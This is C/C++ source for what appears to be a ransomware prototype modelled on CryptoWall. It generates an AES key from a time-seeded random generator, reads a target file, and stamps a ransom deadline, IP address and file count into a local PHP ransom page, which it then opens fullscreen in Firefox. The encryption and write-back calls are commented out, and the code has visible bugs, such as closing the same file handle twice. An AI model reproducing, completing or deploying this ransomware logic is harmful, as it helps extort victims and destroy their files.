#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include "aes.h"

int main() {
  /// HIDE CONSOLE
  //FreeConsole();

  /// GENERATE KEY
  unsigned int cant_files = 0;
  uint8_t key[32];
  time_t seed = time(NULL);
  srand(seed);
  for (uint8_t i = 0; i < 32; i++)
    key[i] = rand() % 256;

  FILE* pFile = fopen("key.bin", "wb");
  fwrite(key, sizeof(uint8_t), 32, pFile);
  fclose(pFile);

  /// ENCRYPT FILES
  char fname[32];
  scanf("%s", fname); // <---

  FILE* file = fopen(fname, "rb+");
  fseek(file, 0, SEEK_END);
  uint32_t size = ftell(file);
/*
  // ANSI X9.23 Start
  uint8_t len = AES_BLOCKLEN - size % AES_BLOCKLEN;
  uint8_t* pad = new uint8_t[len];
  for (uint8_t i = 0; i < len - 1; i++)
    pad[i] = 0x00;
  pad[len - 1] = len;
  fwrite(pad, sizeof(uint8_t), len, file);
  delete[] pad;
  size += len;
  // ANSI X9.23 End
*/
  rewind(file);
  uint8_t* input = new uint8_t[size];
  fread(input, 1, size, file);

//  AES_encrypt(key, input, size);
/*
  AES_decrypt(key, input, size);
  uint32_t del = input[size - 1];
  size -= del;
*/
//  fwrite(input, sizeof(uint8_t), size, pFile);
  delete[] input;
  fclose(pFile);


  /// GET TIME GMT OF TOMORROW
  unsigned int daysinmon[13] = {0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
  tm* timeinfo = localtime(&seed);
  unsigned int day = timeinfo->tm_mday;
  unsigned int mon = timeinfo->tm_mon + 1;
  unsigned int year = timeinfo->tm_year + 1900;
  if (day == daysinmon[mon]) { // if it's the last day of the month
    day = 1; // tomorrow is 1st
    mon++; // of the next month
    if (mon > 12) { // After december
      mon = 1; // is January
      year++; // of the next year
    }
  } else
    day++; // Or it's just tomorrow
  /// EIGHT HOUR AGO WAS...
  unsigned int hour = timeinfo->tm_hour;
  if (hour < 8) { // PHP use GMT time
    if (day > 1) {
      int remaining = hour - 8;
      hour = 24 - remaining;
      day--; // the last day
    } else {
      if (mon > 1) {
        mon--; // the last month
        day = daysinmon[mon];
      } else {
        day = 31;
        mon = 12;
        year--; // the last year
      }
    }
  } else hour -= 8; // eight hour ago

  // it should be way easier to increase POSIX time in 24 - 8 hours

  /// ADD DATE TO FILE
  FILE* cryptowall = fopen("C:\\xampp\\htdocs\\cryptowall\\index.php", "r+");
  fseek(cryptowall, 96, SEEK_SET);
  fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, mon, day, hour, timeinfo->tm_min, timeinfo->tm_sec);

  /// GET IP
  unsigned int ip[4];
  system("getip.bat"); // it's the local ip, Opera close his ftp server to test ips
  FILE* loadip = fopen("ip", "r+");
  fscanf(loadip, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]);
  fclose(loadip);

  /// ADD IP
  fseek(cryptowall, 1164, SEEK_SET);
  // ip may have different lengths: 0.0.0.0 / 255.255.255.255, pad with spaces
  char buffer[16] = "               ";
  int pad = sprintf(buffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
  buffer[pad] = ' '; // Remove '\0' set by sprintf
  fwrite(buffer, sizeof(char), 15, cryptowall);

  /// ADD Total Files Encrypted
  fseek(cryptowall, 1332, SEEK_SET);
  fprintf(cryptowall, "%1u,%03u", cant_files / 1000, cant_files % 1000);
  fclose(cryptowall);

  /// SHOW MESSAGE FULLSCREEN
  system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window localhost/cryptowall/");
  system("fullscreen.vbs");
  return 0;
}
